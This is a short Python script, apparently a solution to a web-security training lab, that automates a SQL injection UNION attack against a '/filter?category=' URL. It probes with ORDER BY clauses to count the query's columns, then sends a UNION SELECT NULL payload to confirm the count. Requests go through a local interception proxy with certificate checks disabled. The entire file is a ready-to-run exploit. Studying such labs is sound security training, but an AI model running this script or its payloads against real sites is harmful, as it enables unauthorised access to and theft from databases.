
#SQL injection UNION attack, determining the number of columns returned by the query

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[-] Usage %s <url> <payload>"%sys.argv[0])
        sys.exit()
    exploit(url,payload)

def exploit(url,payload):
    url=url+"/filter?category=Accessories"
    for i in range(1,10):
    
        fuzz=url+payload+" order by "+str(i)+" -- "
        r=requests.get(fuzz,verify=False,proxies=proxies)

        if(r.status_code !=200):
            
            print("[+] Found No of colums using order by : "+str(i-1))
            check_cols(url,payload,(i-1))
            sys.exit()

def check_cols(url,payload,no_of_cols):
    check="null,"*(no_of_cols-1)+"null"
    query=url+payload+" union select "+check+" -- "
    print("[*] Testing query : ")
    print(query)
    r=requests.get(query,verify=False,proxies=proxies)
    if(r.status_code==200):
        print("[+] Request Successful ")
    else:
        print("[-] Request Failed")

if __name__=="__main__":
    main()